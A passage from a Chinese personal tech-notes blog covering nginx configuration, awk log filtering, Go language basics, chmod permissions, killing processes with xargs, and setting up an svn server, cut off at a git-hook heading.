class="line"></span><br><span class="line">error_log log/error.log debug; #错误日志路径，级别。</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;   #文件扩展名与文件类型映射表</span><br><span class="line"></span><br><span class="line">    default_type  application/octet-stream; #默认文件类型，默认为text/plain</span><br><span class="line"></span><br><span class="line">    access_log off; #取消服务日志    </span><br><span class="line"></span><br><span class="line">    sendfile on;   #允许 sendfile 方式传输文件，默认为off，可以在http块，server块，location块。</span><br><span class="line"></span><br><span class="line">    sendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span><br><span class="line"></span><br><span class="line">    keepalive_timeout 65;  #连接超时时间，默认为75s，可以在http，server，location块。</span><br><span class="line"></span><br><span class="line">    server </span><br><span class="line">    &#123;</span><br><span class="line">            keepalive_requests 120; #单连接请求上限次数。</span><br><span class="line"></span><br><span class="line">            listen 80; #监听端口</span><br><span class="line"></span><br><span class="line">            server_name  127.0.0.1;   #监听地址      </span><br><span class="line"></span><br><span class="line">            index index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">            root your_path;  #根目录</span><br><span class="line"></span><br><span class="line">            location ~ \.php$</span><br><span class="line">            &#123;</span><br><span class="line">                  fastcgi_pass unix:<span class="regexp">/var/</span>run/php/php7<span class="number">.1</span>-fpm.sock;</span><br><span class="line"></span><br><span class="line">                  #fastcgi_pass 127.0.0.1:9000;</span><br><span class="line"></span><br><span class="line">                  fastcgi_index index.php;</span><br><span class="line"></span><br><span class="line">                  include fastcgi_params;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;upstream test-upstream &#123;</span><br><span class="line">     ip_hash; # 使用 ip_hash 算法分配 https://learnku.com/articles/24795#topnav</span><br><span class="line"> </span><br><span class="line">     server 192.168.1.1; # 要分配的 ip</span><br><span class="line">     server <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> server &#123;</span><br><span class="line"> </span><br><span class="line">     location / &#123;       </span><br><span class="line">         proxy_pass http:<span class="comment">//test-upstream;</span></span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="nginx日志中提取5分钟内访问状态非200的记录"><a href="#nginx日志中提取5分钟内访问状态非200的记录" class="headerlink" title="nginx日志中提取5分钟内访问状态非200的记录"></a>nginx日志中提取5分钟内访问状态非200的记录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nginx部分访问日志如下：</span><br><span class="line"></span><br><span class="line"><span class="number">100.0</span><span class="number">.0</span><span class="number">.16</span> - - [<span class="number">27</span>/Aug/<span class="number">2015</span>:<span class="number">10</span>:<span class="number">44</span>:<span class="number">58</span> +<span class="number">0000</span>] GET www HTTP/<span class="number">1.1</span> “<span class="number">200</span>” <span class="number">15</span> “-” “-” “-” “<span class="number">3.254</span>” “<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">80</span>”</span><br><span class="line"></span><br><span class="line"><span class="number">100.0</span><span class="number">.1</span><span class="number">.13</span> - - [<span class="number">27</span>/Aug/<span class="number">2015</span>:<span class="number">10</span>:<span class="number">45</span>:<span class="number">22</span> +<span class="number">0000</span>] GET www HTTP/<span class="number">1.1</span> “<span class="number">200</span>” <span class="number">90</span> “-” “-” “-” “<span class="number">0.498</span>” “<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">80</span>”</span><br><span class="line"></span><br><span class="line"><span class="number">100.0</span><span class="number">.1</span><span class="number">.13</span> - - [<span class="number">27</span>/Aug/<span class="number">2015</span>:<span class="number">10</span>:<span class="number">46</span>:<span class="number">26</span> +<span class="number">0000</span>] GET www HTTP/<span class="number">1.1</span> “<span class="number">200</span>” <span class="number">90</span> “-” “-” “-” “<span class="number">1.704</span>” “<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">80</span>”</span><br><span class="line"></span><br><span class="line"><span class="number">100.0</span><span class="number">.1</span><span class="number">.16</span> - - [<span class="number">27</span>/Aug/<span class="number">2015</span>:<span class="number">10</span>:<span class="number">46</span>:<span class="number">35</span> +<span class="number">0000</span>] GET www HTTP/<span class="number">1.1</span> “<span class="number">200</span>” <span class="number">94</span> “-” “-” “-” “<span class="number">1.189</span>” “<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">80</span>”</span><br><span class="line"></span><br><span class="line">采用awk多分隔符实现</span><br><span class="line">awk -F<span class="string">'[/ "]'</span> <span class="string">'$6&gt;="2015:10:44:00" &amp;&amp; $6&lt;="2015:10:49:00" &amp;&amp; $13 != 200'</span></span><br><span class="line"></span><br><span class="line">分析<span class="number">2015</span>/<span class="number">8</span>/<span class="number">15</span> 到 <span class="number">2015</span>/<span class="number">8</span>/<span class="number">16</span> 访问<span class="string">"/index.php?g=Member&amp;m=Public&amp;a=sendValidCode"</span>的IP倒序排列</span><br><span class="line"></span><br><span class="line">cat log_file | egrep <span class="string">'15/Aug/2015|16/Aug/2015'</span> | awk <span class="string">'&#123;if($7 == "/index.php?g=Member&amp;m=Public&amp;a=sendValidCode") print $1,$7&#125;'</span>|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>
<h3 id="golang入门"><a href="#golang入门" class="headerlink" title="golang入门"></a>golang入门</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b []int</span><br><span class="line">numbers := make([]int,<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line"><span class="comment">// 创建切片</span></span><br><span class="line">number2 := make([]int, <span class="number">15</span>)</span><br><span class="line"><span class="comment">// 将原始切片复制到新切片</span></span><br><span class="line">copy(number2, number)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化长度为 4，以及赋值</span></span><br><span class="line">number2 := []int&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">fmt.Println(numbers) <span class="comment">// -&gt; [1 2 3 4]</span></span><br><span class="line"><span class="comment">// 创建子切片</span></span><br><span class="line">slice1 := number2[<span class="number">2</span>:]</span><br><span class="line">fmt.Println(slice1) <span class="comment">// -&gt; [3 4]</span></span><br><span class="line">slice2 := number2[:<span class="number">3</span>]</span><br><span class="line">fmt.Println(slice2) <span class="comment">// -&gt; [1 2 3]</span></span><br><span class="line">slice3 := number2[<span class="number">1</span>:<span class="number">4</span>]</span><br><span class="line">fmt.Println(slice3) <span class="comment">// -&gt; [2 3 4]</span></span><br><span class="line"><span class="keyword">if</span> num := <span class="number">9</span>; num &lt; <span class="number">0</span> &#123;</span><br><span class="line"> fmt.Println(num, <span class="string">"is negative"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> num &lt; <span class="number">10</span> &#123;</span><br><span class="line"> fmt.Println(num, <span class="string">"has 1 digit"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> fmt.Println(num, <span class="string">"has multiple digits"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ap *int ap  是指向整数类型的指针。＆ 运算符可用于获取变量的地址。</span><br><span class="line">            </span><br><span class="line">            a := <span class="number">12</span></span><br><span class="line">            ap = &amp;a</span><br><span class="line">            可以使用 * 运算符访问指针指向的值：</span><br><span class="line">            </span><br><span class="line">            fmt.Println(*ap)</span><br><span class="line">            <span class="comment">// =&gt; 12</span></span><br><span class="line"> func increment(i *int) &#123;</span><br><span class="line">   *i++</span><br><span class="line"> &#125;</span><br><span class="line"> func main() &#123;</span><br><span class="line">   i := <span class="number">10</span></span><br><span class="line">   increment(&amp;i)</span><br><span class="line">   fmt.Println(i)</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//=&gt; 11</span></span><br><span class="line"> func add(a int, b int) int &#123;</span><br><span class="line">   c := a + b</span><br><span class="line">   <span class="keyword">return</span> c</span><br><span class="line"> &#125;           </span><br><span class="line">   func add(a int, b int) (c int) &#123;</span><br><span class="line">     c = a + b</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line">   &#125;         </span><br><span class="line">    func add(a int, b int) (int, string) &#123;</span><br><span class="line">      c := a + b</span><br><span class="line">      <span class="keyword">return</span> c, <span class="string">"successfully added"</span></span><br><span class="line">    &#125; </span><br><span class="line">    type person struct &#123;</span><br><span class="line">      name string</span><br><span class="line">      age int</span><br><span class="line">      gender string</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//方式1：指定属性和值</span></span><br><span class="line">   p = person&#123;<span class="attr">name</span>: <span class="string">"Bob"</span>, <span class="attr">age</span>: <span class="number">42</span>, <span class="attr">gender</span>: <span class="string">"Male"</span>&#125;</span><br><span class="line">   <span class="comment">//方式2：指定值</span></span><br><span class="line">   person&#123;<span class="string">"Bob"</span>, <span class="number">42</span>, <span class="string">"Male"</span>&#125;</span><br><span class="line">   p.name</span><br><span class="line">   <span class="comment">//=&gt; Bob</span></span><br><span class="line">   </span><br><span class="line">   pp = &amp;person&#123;<span class="attr">name</span>: <span class="string">"Bob"</span>, <span class="attr">age</span>: <span class="number">42</span>, <span class="attr">gender</span>: <span class="string">"Male"</span>&#125;</span><br><span class="line">   pp.name</span><br><span class="line">   <span class="comment">//=&gt; Bob</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">//定义结构体</span></span><br><span class="line">type person struct &#123;</span><br><span class="line">  name   string</span><br><span class="line">  age    int</span><br><span class="line">  gender string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line">func (p *person) describe() &#123;</span><br><span class="line">  fmt.Printf(<span class="string">"%v is %v years old."</span>, p.name, p.age)</span><br><span class="line">&#125;</span><br><span class="line">func (p *person) setAge(age int) &#123;</span><br><span class="line">  p.age = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (p person) setName(name string) &#123;</span><br><span class="line">  p.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  pp := &amp;person&#123;<span class="attr">name</span>: <span class="string">"Bob"</span>, <span class="attr">age</span>: <span class="number">42</span>, <span class="attr">gender</span>: <span class="string">"Male"</span>&#125;</span><br><span class="line">  pp.describe()</span><br><span class="line">  <span class="comment">// =&gt; Bob is 42 years old</span></span><br><span class="line">  pp.setAge(<span class="number">45</span>)</span><br><span class="line">  fmt.Println(pp.age)</span><br><span class="line">  <span class="comment">//=&gt; 45</span></span><br><span class="line">  pp.setName(<span class="string">"Hari"</span>)</span><br><span class="line">  fmt.Println(pp.name)</span><br><span class="line">  <span class="comment">//=&gt; Bob</span></span><br><span class="line">&#125;</span><br><span class="line">Go 的接口是一系列方法的集合。接口有助于将类型的属性组合在一起 结构体是不同字段的类型集合。 结构用于将数据分组在一起。</span><br><span class="line">type animal interface &#123;</span><br><span class="line">  description() string</span><br><span class="line">&#125;</span><br><span class="line">type cat struct &#123;</span><br><span class="line">  Type  string</span><br><span class="line">  Sound string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type snake struct &#123;</span><br><span class="line">  Type      string</span><br><span class="line">  Poisonous bool</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (s snake) description() string &#123;</span><br><span class="line">  <span class="keyword">return</span> fmt.Sprintf(<span class="string">"Poisonous: %v"</span>, s.Poisonous)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (c cat) description() string &#123;</span><br><span class="line">  <span class="keyword">return</span> fmt.Sprintf(<span class="string">"Sound: %v"</span>, c.Sound)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  <span class="keyword">var</span> a animal</span><br><span class="line">  a = snake&#123;<span class="attr">Poisonous</span>: <span class="literal">true</span>&#125;</span><br><span class="line">  fmt.Println(a.description())</span><br><span class="line">  a = cat&#123;<span class="attr">Sound</span>: <span class="string">"Meow!!!"</span>&#125;</span><br><span class="line">  fmt.Println(a.description())</span><br><span class="line">&#125;</span><br><span class="line">godoc person Description</span><br><span class="line"> 它将会为我们的 person 包内部的 Description 函数生成文档。查看文档的话只需要使用如下命令启动一个 web 服务器就可以：</span><br><span class="line"> </span><br><span class="line"> godoc -http=<span class="string">":8080"</span></span><br><span class="line"> 现在去访问这个 URL http:<span class="comment">//localhost:8080/pkg/ 然后你就可以看到我们刚创建的包文档了。</span></span><br><span class="line">func main()&#123;</span><br><span class="line">  resp, <span class="attr">err</span> := http.Get(<span class="string">"http://example.com/"</span>)</span><br><span class="line">  <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  fmt.Println(resp)</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/24715#reply83037</span></span><br></pre></td></tr></table></figure>
<h3 id="linux-chmod"><a href="#linux-chmod" class="headerlink" title="linux chmod"></a>linux chmod</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">777</span> --- 代表所有人都有最高权限</span><br><span class="line"><span class="number">755</span> --- 执行文件的常用权限</span><br><span class="line"><span class="number">644</span> --- 普通文件的常用权限</span><br><span class="line">关于为什么有文件的写权限，却不能删除文件的问题解释</span><br><span class="line"></span><br><span class="line">对于某个目录或文件拥有的w权限，针对的是里面的内容，而不是文件本身</span><br><span class="line"></span><br><span class="line">由此，对文件的删除是对文件所在目录的写，故必须有目录的写权限才可以</span><br><span class="line">对文件来讲： 最高权限是 x（执行）</span><br><span class="line">对目录来讲： 最高权限是 w（写）具有修改目录结构的权限。如新建文件和目录，删除此目录下文件和目录，重命名此目录下文件和目录，剪切</span><br><span class="line"></span><br><span class="line">针对目录</span><br><span class="line"><span class="number">755</span>是最常用的权限设定方式，（目录所有者可以删除和创建目录下文件，其他人只能进入看看）</span><br><span class="line"></span><br><span class="line">稍微严谨一点是<span class="number">750</span>，其他人进都进不来</span><br><span class="line"></span><br><span class="line">极端严谨一点是<span class="number">700</span>，就我自己能进能看能改，其他所有拒之门外</span><br><span class="line">针对普通文件</span><br><span class="line"><span class="number">644</span>是最常用的权限设定方式，（文件所有者能看能改，其他人只能看）</span><br><span class="line"></span><br><span class="line"><span class="number">640</span>是其他人不能看不能改</span><br><span class="line"></span><br><span class="line"><span class="number">600</span>是其他所有人不能看不能改</span><br><span class="line">针对可执行文件</span><br><span class="line"><span class="number">754</span>是最常用的权限设定方式，（文件所有者可以看改执行，组内可以执行，其他人只能看）</span><br><span class="line"></span><br><span class="line"><span class="number">750</span>、<span class="number">740</span>、<span class="number">700</span>都是可以的</span><br><span class="line">还有一点</span><br><span class="line">文件所有者必须为<span class="number">7</span>或者是<span class="number">6</span>，要不就是傻逼 https:<span class="comment">//learnku.com/articles/22095#topnav</span></span><br><span class="line"></span><br><span class="line">通过 kill ps -ef | grep <span class="string">'ddd'</span> https:<span class="comment">//learnku.com/articles/21339#topnav</span></span><br><span class="line"></span><br><span class="line">这种形式，这个时候实际上等同于拼接字符串得到的命令，其效果类似于 kill $pid</span><br><span class="line"><span class="keyword">for</span> procid <span class="keyword">in</span> $(ps -aux | grep <span class="string">"some search"</span> | awk <span class="string">'&#123;print $2&#125;'</span>); <span class="keyword">do</span> kill <span class="number">-9</span> $procid; done</span><br><span class="line"></span><br><span class="line">其实与第一种原理一样，只不过需要多次kill的时候是循环处理的，每次处理一个</span><br><span class="line">ps -ef | grep <span class="string">'ddd'</span> | xargs kill</span><br><span class="line">echo <span class="string">'11@22@33@44@55@66@77@88@99@00'</span> | xargs -d <span class="string">'@'</span> -n <span class="number">3</span> echo</span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line"><span class="number">11</span> <span class="number">22</span> <span class="number">33</span></span><br><span class="line"><span class="number">44</span> <span class="number">55</span> <span class="number">66</span></span><br><span class="line"><span class="number">77</span> <span class="number">88</span> <span class="number">99</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line">find的输出结果是每条记录后面加上换行，也就是每条记录是一个新行</span><br><span class="line">find . -name <span class="string">"*.txt"</span> -print0</span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">./<span class="number">2.</span>txt./<span class="number">3.</span>txt./<span class="number">1.</span>txt     =&gt; 加上 -print0 参数表示find输出的每条结果后面加上 <span class="string">'\0'</span> 而不是换行</span><br><span class="line">find . -name <span class="string">"*.txt"</span> -print0 | xargs <span class="number">-0</span> echo</span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">./<span class="number">2.</span>txt ./<span class="number">3.</span>txt ./<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
<h3 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">禁止空主机头和未授权域名访问</span><br><span class="line">$ vim conf.d/<span class="keyword">default</span>.conf</span><br><span class="line">server &#123;</span><br><span class="line">     listen <span class="number">80</span> <span class="keyword">default</span>;</span><br><span class="line">     server_name _;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">500</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ vim vhosts/blog.yiranzai.cn.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen       <span class="number">80</span>;</span><br><span class="line">    server_name  blog.yiranzai.cn;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http:<span class="comment">//127.0.0.1:88;</span></span><br><span class="line">	    include /etc/nginx/proxy.conf;       #代理配置</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ vim proxy.conf</span><br><span class="line">proxy_set_header   Host             $host;</span><br><span class="line">proxy_set_header   X-Real-IP        $remote_addr;</span><br><span class="line">proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;</span><br><span class="line">$ firewall-cmd --zone=public --add-port=<span class="number">80</span>/tcp --permanent</span><br><span class="line">success</span><br><span class="line">$ firewall-cmd --reload</span><br><span class="line">success</span><br><span class="line">systemctl start nginx.service           #启动nginx</span><br><span class="line">systemctl enable nginx.service          #将nginx开机启动</span><br><span class="line">systemctl stop nginx.service            #停止nginx服务</span><br><span class="line">systemctl reload nginx.service          #重新加载nginx配置（推荐）</span><br><span class="line">systemctl restart nginx.service         #重启nginx服务（不推荐，会关闭所有进程）</span><br><span class="line"></span><br><span class="line">php-fpm  </span><br><span class="line">fastcgi_finish_request() - 特殊功能：用于在请求完成和刷新数据后，继续在后台执行耗时的工作（录入视频转换、统计处理等）；</span><br></pre></td></tr></table></figure>
<h3 id="svn搭建"><a href="#svn搭建" class="headerlink" title="svn搭建"></a>svn搭建</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">yum install -y subversion</span><br><span class="line"></span><br><span class="line">$ mkdir /<span class="keyword">var</span>/www/svn</span><br><span class="line">$ cd /<span class="keyword">var</span>/www/svn</span><br><span class="line">$ svnadmin create /<span class="keyword">var</span>/www/svn</span><br><span class="line">$ ls</span><br><span class="line">conf  db  format  hooks  locks  README.txt</span><br><span class="line">$ vim conf/passwd</span><br><span class="line">[users]</span><br><span class="line"># harry = harryssecret</span><br><span class="line"># 账号 = 密码</span><br><span class="line">svn = svnpasswd</span><br><span class="line">svnre = svnrepasswd</span><br><span class="line">$ vim conf/authz</span><br><span class="line">[<span class="regexp">/]         /</span><span class="regexp">/仓库下所有文件</span></span><br><span class="line"><span class="regexp">svn=rw      /</span><span class="regexp">/可读可写</span></span><br><span class="line"><span class="regexp">svnre=r     /</span><span class="regexp">/只读</span></span><br><span class="line"><span class="regexp">*=          /</span><span class="regexp">/其他用户无任何权限$ vim conf/</span>svnserve.conf</span><br><span class="line">                       </span><br><span class="line">                       anon-access = read #匿名用户可读</span><br><span class="line">                       auth-access = write #授权用户可写</span><br><span class="line">                       password-db = passwd #使用哪个文件作为账号文件</span><br><span class="line">                       authz-db = authz #使用哪个文件作为权限文件</span><br><span class="line">                       realm = /var/www/svn/ # 认证空间名，版本库所在目录</span><br><span class="line">$ svnserve -d -r /<span class="keyword">var</span>/www/svn                       <span class="comment">//-d 表示守护进程， -r 表示在后台执行，默认端口为3690</span></span><br><span class="line">$ svnserve -d -r --listen-port <span class="number">3691</span> /<span class="keyword">var</span>/www/svn    <span class="comment">//指定3691端口启动该服务</span></span><br><span class="line">$ killall svnserve                                  <span class="comment">//停止全部</span></span><br><span class="line">$ ps -ef | grep svnserve</span><br><span class="line">root      <span class="number">4148</span>     <span class="number">1</span>  <span class="number">0</span> Dec12 ?        <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> svnserve -d -r /<span class="keyword">var</span>/www/svn/a/</span><br><span class="line">root      <span class="number">8995</span>     <span class="number">1</span>  <span class="number">0</span> Dec09 ?        <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> svnserve -d -r /<span class="keyword">var</span>/www/svn/b/ --listen-port <span class="number">3691</span></span><br><span class="line">root     <span class="number">14855</span>     <span class="number">1</span>  <span class="number">0</span> Dec19 ?        <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> svnserve -d -r /<span class="keyword">var</span>/www/svn/c/ --listen-port <span class="number">3692</span></span><br><span class="line">root     <span class="number">27538</span> <span class="number">27343</span>  <span class="number">0</span> <span class="number">09</span>:<span class="number">39</span> pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> grep --color=auto svnserve</span><br><span class="line">$ kill <span class="number">8995</span>                 <span class="comment">//停止3692端口的svnserve                       </span></span><br><span class="line">windows中使用TortoiseSVN连接，输入地址 svn:<span class="comment">//118.24.158.116/ 即可，不出意外输入用户名svn和密码svnrepasswd就能连接成功了。</span></span><br><span class="line">默认端口<span class="number">3690</span>，如果你修改了端口，那么要记得加上端口号。</span><br></pre></td></tr></table></figure>
<h3 id="Git-钩子检查-PHP-语法和代码规范"><a href="#Git-钩子检查-PHP-语法和代码规范" class="headerlink" title="Git 钩子检查 PHP 语法和代码规范"></a>Git 钩子检查 PHP 语法和代码规范</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 